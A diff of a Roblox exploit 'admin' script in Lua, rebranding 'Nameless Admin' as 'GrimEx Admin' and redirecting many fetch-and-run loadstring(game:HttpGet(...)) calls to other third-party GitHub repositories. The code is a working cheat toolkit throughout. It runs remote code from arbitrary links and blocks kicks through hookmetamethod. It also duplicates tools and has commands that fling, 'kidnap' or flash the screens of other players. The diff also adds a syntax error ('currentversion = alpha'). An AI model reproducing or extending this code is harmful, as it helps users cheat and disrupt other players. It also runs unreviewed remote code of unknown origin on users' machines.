@@ -8,17 +8,17 @@
 
 spawn(function()
 print([[
-╭━╮╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╭╮
-┃┃╰╮┃┃╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱┃╭━╮┃╱┃┃
-┃╭╮╰╯┣━━┳╮╭┳━━┫┃╭━━┳━━┳━━╮┃┃╱┃┣━╯┣╮╭┳┳━╮
-┃┃╰╮┃┃╭╮┃╰╯┃┃━┫┃┃┃━┫━━┫━━┫┃╰━╯┃╭╮┃╰╯┣┫╭╮╮
-┃┃╱┃┃┃╭╮┃┃┃┃┃━┫╰┫┃━╋━━┣━━┃┃╭━╮┃╰╯┃┃┃┃┃┃┃┃
-╰╯╱╰━┻╯╰┻┻┻┻━━┻━┻━━┻━━┻━━╯╰╯╱╰┻━━┻┻┻┻┻╯╰╯
+  _____      _           ______                    _           _       
+ / ____|    (_)         |  ____|          /\      | |         (_)      
+| |  __ _ __ _ _ __ ___ | |__  __  __    /  \   __| |_ __ ___  _ _ __  
+| | |_ | '__| | '_ ` _ \|  __| \ \/ /   / /\ \ / _` | '_ ` _ \| | '_ \
+| |__| | |  | | | | | | | |____ >  <   / ____ \ (_| | | | | | | | | | |
+ \_____|_|  |_|_| |_| |_|______/_/\_\ /_/    \_\__,_|_| |_| |_|_|_| |_|  
 ]])
 end)
  
  -- Notification library
- local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/notifications"))();
+ local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/notificationtest"))();
  local Notify = Notification.Notify;
  
  -- Custom file functions checker checker
@@ -27,23 +27,23 @@ end)
  
  -- Creates folder & files for Prefix & Plugins
  if FileSupport then
- if not isfolder('Nameless-Admin') then
- makefolder('Nameless-Admin')
+ if not isfolder('GrimEx-Admin') then
+ makefolder('GrimEx-Admin')
  end
  
- if not isfolder('Nameless-Admin/Plugins') then
-	 makefolder('Nameless-Admin/Plugins')
+ if not isfolder('GrimEx-Admin/Plugins') then
+	 makefolder('GrimEx-Admin/Plugins')
  end
  
- if not isfile("Nameless-Admin/Prefix.txt") then
- writefile("Nameless-Admin/Prefix.txt", ';')
+ if not isfile("GrimEx-Admin/Prefix.txt") then
+ writefile("GrimEx-Admin/Prefix.txt", ';')
  else
  end
  end
  
  -- [[ PREFIX AND OTHER STUFF. ]] -- 
  local opt = {
-	 prefix = readfile("Nameless-Admin/Prefix.txt", ';'),
+	 prefix = readfile("GrimEx-Admin/Prefix.txt", ';'),
 	 tupleSeparator = ',',
 	 ui = {					
 		 
@@ -54,7 +54,7 @@ end)
  }
  
  -- [[ Version ]] -- 
- currentversion = 2.1
+  currentversion = alpha 
  
  --[[ VARIABLES ]]--
  PlaceId, JobId = game.PlaceId, game.JobId
@@ -143,7 +143,7 @@ end)
 	 end
 	 commandcount = commandcount + 1
  end
- 
+
  cmd.run = function(args)
 	 local caller, arguments = args[1], args; table.remove(args, 1);
 	 local success, msg = pcall(function()
@@ -630,15 +630,11 @@ local _, indexx = cmdtxtbar:find("%s")
 local thecode = cmdtxtbar:sub(indexx + 1)
 assert(loadstring(thecode))()
  end)
-
+ 
  cmd.add({"loadstring", "ls"}, {"loadstring <link> (ls)", "Run the code using loadstring"}, function(source)
 	loadstring(game:HttpGet(source))()
 end)
- 
- cmd.add({"executor", "exec"}, {"executor (exec)", "Very simple executor"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/executor"))()
- end)
- 
+
  cmd.add({"scripthub", "hub"}, {"scripthub (hub)", "Thanks to scriptblox api"}, function()
 	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/script%20hub"))()
  end)
@@ -753,7 +749,7 @@ end)
  end)
  
  cmd.add({"plugins"}, {"plugins", "Check what kind of plugins you have, add plugins using a gui, delete a plugin."}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminPlugin"))();
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/NamelessAdminPlugin"))();
  end)
  
  cmd.add({"prefix"}, {"prefix <prefix>", "Changes the admin prefix"}, function(...)
@@ -762,14 +758,14 @@ end)
  if PrefixChange == nil then
  Notify({
  Description = "Please enter a valid prefix";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
  elseif PrefixChange == "p" or PrefixChange == "[" or PrefixChange == "P" then
 	 Notify({
 		 Description = "idk why but this prefix breaks changing the prefix so pick smthing else alr?";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 
 		 });
@@ -777,7 +773,7 @@ end)
  opt.prefix = PrefixChange
  Notify({
  Description = "Prefix set to " .. PrefixChange .. "";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -791,23 +787,23 @@ end)
  if PrefixChange == nil then
  Notify({
  Description = "Please enter a valid prefix";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
  elseif PrefixChange == "p" or PrefixChange == "[" or PrefixChange == "P" then
 	 Notify({
 		 Description = "idk why but this prefix breaks changing the prefix so pick smthing else alr?";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 
 		 });
 	 else
- writefile("Nameless-Admin\\Prefix.txt", PrefixChange)
+ writefile("GrimEx-Admin\\Prefix.txt", PrefixChange)
  opt.prefix = PrefixChange
  Notify({
  Description = "Prefix saved to '" .. PrefixChange .. "'";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -850,7 +846,7 @@ end)
  
  Notify({
  Description = "Hat orbit loaded, if you wanna orbit other people type in the chat .orbit playername";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 10;
  
  });
@@ -1708,10 +1704,9 @@ end)
  cmd.add({"godmode", "god"}, {"godmode (god)", "Makes you unable to be killed"}, function()
 	 loadstring(game:HttpGet(('https://pastebin.com/raw/bbyuynM1'),true))()
  end)
-
+ 
 cmd.add({"TeleportGui", "TPui"}, {"TeleportGui (TPui)", "Gives an UI that grabs all places and teleports you by clicking a simple button"}, function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Game%20Universe%20Viewer"))()
---obfuscated so dont even try
  end)
  
  cmd.add({"clickfling", "mousefling"}, {"mousefling (clickfling)", "Fling a player by clicking them"}, function()
@@ -2043,8 +2038,8 @@ print(Time)
  cmd.add({"commandcount", "cc"}, {"commandcount (cc)", "Counds how many commands NA has"}, function()
  
  Notify({
-	 Description = "Nameless Admin currently has ".. commandcount .. " commands";
-	 Title = "Nameless Admin";
+	 Description = "GrimEx Admin currently has ".. commandcount .. " commands";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -2054,7 +2049,7 @@ print(Time)
  cmd.add({"walkfling", "wfling"}, {"walkfling (wfling) [THANKS TO X]", "probably the best fling lol"}, function()
 	 Notify({
 		 Description = "Walkfling enabled";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 
 		 });
@@ -2100,7 +2095,7 @@ print(Time)
  cmd.add({"unwalkfling", "unwfling"}, {"unwalkfling (unwfling)", "stop the walkfling command"}, function()
 	 Notify({
 		 Description = "Walkfling disabled";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 
 		 });
@@ -2233,7 +2228,7 @@ print(Time)
  
  Notify({
  Description = "Rejoining...";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -2432,8 +2427,10 @@ print(Time)
  CF = Player.Character.HumanoidRootPart.CFrame
  player.CharacterAdded:wait(1):waitForChild("HumanoidRootPart").CFrame = CF
  
+ -- Teleport the first player to the position next to the second player
  getChar().HumanoidRootPart.CFrame = CFrame.new(gripPosition) + Vector3.new(0, 3, 0)
  
+ -- Tween the first player to the second player's position
  local tween = game:GetService("TweenService"):Create(getChar().HumanoidRootPart, TweenInfo.new(1), {CFrame = target2.Character.HumanoidRootPart.CFrame})
  tween:Play()
  
@@ -2464,7 +2461,7 @@ print(Time)
  
  Notify({
  Description = accountage;
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -2920,7 +2917,7 @@ print(Time)
  end)
  
  cmd.add({"punch"}, {"punch", "punch tool that flings"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/punch",true))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/punch",true))()
  end)
  
  cmd.add({"vfly", "vehiclefly"}, {"vehiclefly (vfly)", "be able to fly vehicles"}, function(...)
@@ -2934,7 +2931,7 @@ print(Time)
 		 
 		 Notify({
 		 Description = "Vehicle fly enabled";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 	 
  });
@@ -2947,13 +2944,13 @@ print(Time)
  
  cmd.add({"unvfly", "unvehiclefly"}, {"unvehiclefly (unvfly)", "disable vehicle fly"}, function()
  
-		 
+
 		 
 		 wait();
 		 
 		 Notify({
 		 Description = "Vehicle fly disabled";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 	 
  });
@@ -3298,7 +3295,7 @@ print(Time)
  
  Notify({
  Description = "Break layered clothing executed, if you havent already equip shirt, jacket, pants and shoes (Layered Clothing ones)";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -3337,7 +3334,7 @@ print(Time)
  end
  end
  Noclipping = RunService.Stepped:Connect(NoclipLoop)
- loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  end)
 
  
@@ -3418,7 +3415,8 @@ print(Time)
  
  cmd.add({"vr", "clovr", "vrscript", "fevr"}, {"vr (clovr, vrscript, fevr)", "FE VR SCRIPT AKA CLOVR"}, function()
 	-- [[ should be patched ]] --
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/CloVR"))();
+   
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/CloVR"))();
  end)
 
 cmd.add({"antilag", "boostfps"}, {"antilag (boostfps)", "Low Graphics"}, function()
@@ -3447,7 +3445,7 @@ _G.Settings = {
         ["Low Quality Parts"] = true
     }
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/low%20detail"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/antilag"))()
  end)
  
  cmd.add({"flash"}, {"flash <player>", "Flashes the targets screen"}, function(...)
@@ -3691,7 +3689,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
  else
  Notify({
  Description = "Sorry, wont replicate for this game, try another game.";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -4295,7 +4293,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
 					 
 					 Notify({
 					 Description = "Anti sit enabled";
-					 Title = "Nameless Admin";
+					 Title = "GrimEx Admin";
 					 Duration = 5;
 					 
  });
@@ -4311,7 +4309,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
 					 
 					 Notify({
 					 Description = "Anti sit disabled";
-					 Title = "Nameless Admin";
+					 Title = "GrimEx Admin";
 					 Duration = 5;
 					 
  });
@@ -4340,7 +4338,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
  
 			 Notify({
 				 Description = "Respect Filtering Enabled is on";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 5;
 				 
 				 });
@@ -4348,7 +4346,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
 				 
  Notify({
 	 Description = "Respect Filtering Enabled is off";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -4422,19 +4420,19 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuu
  cmd.add({"dupetools"}, {"dupetools [amount]", "Probably the fastest tool duping method"}, function(...)
  _G.ammount = (...)
  for i=1,_G.ammount do
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/dupe%20tools",true))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/joshclark756/joshclark756-s-scripts/main/dupetools.lua",true))()
  end
  end)
  
 		 cmd.add({"harked", "comet"}, {"harked (comet)", "Executes Comet which is like harked"}, function()
 			 Notify({
  Description = "Join the discord to see supported games! Use the discord command to get the invite";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
 	
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/comet"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/Comet"))();
 			 end)
  
 			 cmd.add({"triggerbot", "tbot"}, {"triggerbot (tbot)", "Executes a script that automatically clicks the mouse when the mouse is on a player"}, function()
@@ -4558,7 +4556,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
  
  Notify({
  Description = "Keybind: Q";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -4583,7 +4581,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 				 
 				 Notify({
 				 Description = "Anti AFK has been enabled";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 5;
 				 
  });
@@ -4620,7 +4618,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 						 
 						 Notify({
 						 Description = "Anti attach enabled";
-						 Title = "Nameless Admin";
+						 Title = "GrimEx Admin";
 						 Duration = 5;
 						 
  });
@@ -4636,7 +4634,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 							 
 							 Notify({
 							 Description = "Anti attach disabled";
-							 Title = "Nameless Admin";
+							 Title = "GrimEx Admin";
 							 Duration = 5;
 							 
  });
@@ -4648,7 +4646,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 							 
 							 Notify({
 							 Description = "Anti attach already disabled";
-							 Title = "Nameless Admin";
+							 Title = "GrimEx Admin";
 							 Duration = 5;
 							 
  });
@@ -4663,7 +4661,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 							 
 							 Notify({
 							 Description = "Spawn has been set";
-							 Title = "Nameless Admin";
+							 Title = "GrimEx Admin";
 							 Duration = 5;
 							 
  });
@@ -4770,7 +4768,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 						 
 						 Notify({
 						 Description = "Anti AFK disabled";
-						 Title = "Nameless Admin";
+						 Title = "GrimEx Admin";
 						 Duration = 5;
 						 
  });
@@ -4779,7 +4777,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 						 
 						 Notify({
 						 Description = "Anti AFK already disabled";
-						 Title = "Nameless Admin";
+						 Title = "GrimEx Admin";
 						 Duration = 5;
 						 
  });
@@ -4792,7 +4790,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
  
  Notify({
  Description = "For a better experience, use R6 if you want tools do ;dupetools 5";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -4824,7 +4822,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
  
 	 local tweenInfo = TweenInfo.new(
 		 1,
-		 Enum.EasingStyle.Quad,	
+		 Enum.EasingStyle.Quad,
 		 Enum.EasingDirection.Out,
 		 0,
 		 false,
@@ -4843,7 +4841,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Namele
 					 end)
  
  cmd.add({"dex"}, {"dex", "Using this you can see the parts / guis / scripts etc with this. A really good and helpful script."}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/dex%20by%20moon"))()
+ 
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/dex"))()
  end)
 
  cmd.add({"SynapseDex", "sdex"}, {"SynapseDex (sdex)", "Loads SynapseX's dex explorer."}, function()
@@ -4913,7 +4912,7 @@ Load(Dex)
 					 
 					 Notify({
 					 Description = "Anti kill enabled";
-					 Title = "Nameless Admin";
+					 Title = "GrimEx Admin";
 					 Duration = 5;
 					 
  });
@@ -4945,7 +4944,7 @@ Load(Dex)
 				 
 				 Notify({
 				 Description = "Anti kill disabled";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 5;
 				 
  });
@@ -4982,7 +4981,7 @@ Load(Dex)
  wait();
  Notify({
  Description = "Anti fling enabled";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
 });
@@ -4994,7 +4993,7 @@ AntiFling = true
 wait();
 Notify({
 Description = "Anti fling disabled";
-Title = "Nameless Admin";
+Title = "GrimEx Admin";
 Duration = 5;
 
 });
@@ -5015,11 +5014,11 @@ end
 				wait();
 				Notify({
 				Description = "Wait a few seconds for it to load";
-				Title = "Nameless Admin";
+				Title = "GrimEx Admin";
 				Duration = 5;
 				
 });
-				 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/gravity%20gun"))()
+				 loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/gravgun"))()
 			 end)
  
 			 cmd.add({"flingnpcs"}, {"flingnpcs", "Flings NPCs"}, function()
@@ -5208,7 +5207,7 @@ until npcfollowloop == false
  
  Notify({
  Description = "ControlNPCs executed, CTRL + Click on an NPC";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -5266,7 +5265,7 @@ until npcfollowloop == false
  
  Notify({
  Description = "AttachPart executed, CTRL + Click on a part";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -5438,7 +5437,7 @@ EnableShiftlock()
 end)
 
 cmd.add({"mobileshiftlock", "msl"}, {"mobileshiftlock (msl)", "Enables shiftlock for mobie"}, function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/shiftlock"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/mobileshiftlock"))()
 end)
  
 cmd.add({"unshiftlock", "unsl"}, {"unshiftlock (unsl)", "Disables shiftlock"}, function()
@@ -5636,7 +5635,7 @@ end
  
  Notify({
  Description = "Netless has been activated, re-run this script if you die";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -5650,7 +5649,7 @@ end
  
  Notify({
  Description = "Get ready to launch...";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -5809,7 +5808,7 @@ end
  
  Notify({
  Description = "Kidnapping... next time take a van, or not";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -5993,7 +5992,7 @@ end
  Control = false
  end)
  
- cmd.add({"reset", "die"}, {"reset (die)", "Makes your health be 0"}, function()
+ cmd.add({"reset"}, {"reset", "Makes your health be 0"}, function()
 	 game.Players.LocalPlayer.Character.Humanoid.Health = 0
  end)
  
@@ -6003,20 +6002,20 @@ end
 	 local Player = getPlr(...)
 	 if Player ~= nil and not Admin[Player.UserId] then
 		 Admin[Player.UserId] = {Player = Player}
-		 ChatMessage("/w "..Player.Name.." [Nameless Admin] You've got admin. Prefix: ';'")
+		 ChatMessage("/w "..Player.Name.." [GrimEx Admin] You've got admin. Prefix: ';'")
 		 wait(0.2)
-		 ChatMessage("/w "..Player.Name.." [Nameless Admin Commands] glue, unglue, fling, fling2, spinfling, unspinfling, fcd, fti, fpp, fireremotes, holdhat")
+		 ChatMessage("/w "..Player.Name.." [GrimEx Admin Commands] glue, unglue, fling, fling2, spinfling, unspinfling, fcd, fti, fpp, fireremotes, holdhat")
 		 ChatMessage("/w "..Player.Name.." reset, commitoof, seizure, unseizure, toolorbit, lay, fall, toolspin, hatspin, sit, joke, kanye")
 		 Notify({
 			 Description = "" .. Player.Name .. " has now been whitelisted to use commands";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 15;
 			 
 			 });
 	 else
 		 Notify({
 			 Description = "No player found";
-			 Title = "Nameless Admin";
+			 Title = "GrimEx Admin";
 			 Duration = 15;
 			 
 			 });
@@ -6032,14 +6031,14 @@ end
 				 ChatMessage("/w "..Player.Name.." You can no longer use commands")
 					 Notify({
 				 Description = "" .. Player.Name .. " is no longer an admin";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 15;
 				 
 				 });
 			 else
 						 Notify({
 				 Description = "Player not found";
-				 Title = "Nameless Admin";
+				 Title = "GrimEx Admin";
 				 Duration = 15;
 				 
 				 });
@@ -6048,7 +6047,7 @@ end
  
  cmd.add({"2016"}, {"2016", "2016 CORE GUI"}, function()
 	-- [[ PLAYERBOARD IS BUGGED BUT WILL TRY TO FIX. ]] --
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/2016%20mode"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/2016mode"))()
  end)
  
  cmd.add({"removedn", "nodn", "nodpn"}, {"removedn (nodn, nodpn)", "Removes all display names"}, function()
@@ -6058,7 +6057,7 @@ end
  wait();
  Notify({
  Description = "Display names successfully removed";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -6090,7 +6089,7 @@ end
 	if not hookmetamethod then 
 		Notify({
 			Description = "Your executor does not support anticlientkick";
-			Title = "Nameless Admin";
+			Title = "GrimEx Admin";
 			Duration = 5;
 			
 			});
@@ -6106,7 +6105,7 @@ end
 			return
 			Notify({
 				Description = "A kick was just attempted but was blocked";
-				Title = "Nameless Admin";
+				Title = "GrimEx Admin";
 				Duration = 5;
 				
 				});
@@ -6115,19 +6114,19 @@ end
 			end)
  Notify({
  Description = "Anti kick executed";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
  end)
  
  
- cmd.add({"Frakture", "FraktureSS"}, {"Frakture (FraktureSS)", "Scans for any backdoors using FraktureSS"}, function()
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Frakture"))()
+  cmd.add({"Frakture", "FraktureSS"}, {"Frakture (FraktureSS)", "Scans for any backdoors using FraktureSS"}, function()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/Frakture"))()
  end)
 
  cmd.add({"PartName"}, {"PartName", "gives a ui and allows you click on a part to grab it's path"}, function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/part%20grabber"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/partgrabber"))()
 end)
 
  cmd.add({"backdoor", "backdoorscan"}, {"backdoor (backdoorscan)", "Scans for any backdoors using backdoor.exe by iK4oS"}, function()
@@ -6141,7 +6140,7 @@ end)
  
  Notify({
  Description = "Copied your jobid (" .. jobId .. ")";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -6156,7 +6155,7 @@ end)
  
  Notify({
  Description = "Searching";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -6172,8 +6171,8 @@ end)
 				 end
 				 if #SomeSRVS > 0 then
 				 Notify({
- Description = "Teleporting...";
- Title = "Searched!";
+ Description = "Searched, please wait while we are teleporting you";
+ Title = "GrimEx Admin";
  Duration = 5;
  
  });
@@ -6202,7 +6201,7 @@ end)
 
 		Notify({
 			Description = "Auto Rejoin is now on!";
-			Title = "Nameless Admin";
+			Title = "GrimEx Admin";
 			Duration = 5;
 			
 			}); end)
@@ -6623,8 +6622,8 @@ end)
 		 wait();
 		 
 		 Notify({
-		 Description = "Nameless Admin has detected you using mobile you now have a mfly button click it to enable / disable mobile flying (For easier use)";
-		 Title = "Nameless Admin";
+		 Description = "GrimEx Admin has detected you using mobile you now have a mfly button click it to enable / disable mobile flying (For easier use)";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 });
 		 
@@ -6692,7 +6691,7 @@ end)
 		 
 		 Notify({
 		 Description = "Fly enabled";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 	 
  });
@@ -6711,7 +6710,7 @@ end)
 		 
 		 Notify({
 		 Description = "Not flying anymore";
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 	 
  });
@@ -6748,7 +6747,7 @@ end)
  then
  Notify({
  Description = "You are now R15";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 3;
  
  });
@@ -6756,7 +6755,7 @@ end)
  else
  Notify({
  Description = "An error has occured";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 3;
  
  });
@@ -6776,7 +6775,7 @@ end)
  then
  Notify({
  Description = "You are now R6";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 3;
  
  });
@@ -6784,13 +6783,13 @@ end)
  else
  Notify({
  Description = "An error has occured";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 3;
  
  });
  end
  end)
-
+ 
  local fcpro
  
  cmd.add({"freecam", "fc", "fcam"}, {"freecam [speed] (fc, fcam)", "Enable free camera"}, function(speed)
@@ -6905,7 +6904,6 @@ end)
 		 end
 	 end
  end)
-
 
  
  cmd.add({"limbbounce"}, {"limbbounce [height] [distance]", "Make your limbs bounce around your head"}, function(h, d)
@@ -7243,7 +7241,7 @@ end)
 	 
 	 Notify({
 	 Description = "Hid the player";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -7290,7 +7288,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 	 
 	 Notify({
 	 Description = "Unhid the player";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
  });
@@ -7406,7 +7404,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
  
  
  cmd.add({"animspoofer", "animationspoofer", "spoofanim", "animspoof"}, {"animationspoofer (animspoof, spoofanim)", "Loads up an animation spoofer, spoofs animations that use rbxassetid"}, function()
- loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Animation%20Spoofer"))()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/GrimEx-Admin/main/AnimationSpoofer"))()
  end)
  
  cmd.add({"tooldance", "td"}, {"tooldance <mode> <size>", "Make your tools dance\nModes: tor/sph/inf/rng/whl/wht/voi"}, function(mode, size)
@@ -7584,10 +7582,11 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
  
  Notify({
  Description = "Copied the username of " .. target.DisplayName .. "";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
+ setclipboard(target.Name)
  end)
  
  cmd.add({"copydisplay", "cdisplay"}, {"copydisplay <player> (cdisplay)", "Copies the display name of the target"}, function(...)
@@ -7600,7 +7599,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
  
  Notify({
  Description = "Copied the display name of " .. target.Name .. "";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -7616,7 +7615,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
  
  Notify({
  Description = "Copied the UserId of " .. target.Name .. "";
- Title = "Nameless Admin";
+ Title = "GrimEx Admin";
  Duration = 7;
  
  });
@@ -8035,7 +8034,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 		 
 		 Notify({
 		 Description = description;
-		 Title = "Nameless Admin";
+		 Title = "GrimEx Admin";
 		 Duration = 5;
 		 
 		 });
@@ -8090,7 +8089,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
 	 
 	 Notify({
 	 Description = "Btools loading, wait 2 seconds.";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -8164,7 +8163,7 @@ print(text)
 	 
 	 Notify({
 	 Description = "Netbypass enabled";
-	 Title = "Nameless Admin";
+	 Title = "GrimEx Admin";
 	 Duration = 5;
 	 
 	 });
@@ -8237,7 +8236,7 @@ print(text)
  TextLabel_2.Position = UDim2.new(0.0269662924, 0, 0.162698418, 0)
  TextLabel_2.Size = UDim2.new(0, 421, 0, 115)
  TextLabel_2.Font = Enum.Font.SourceSans
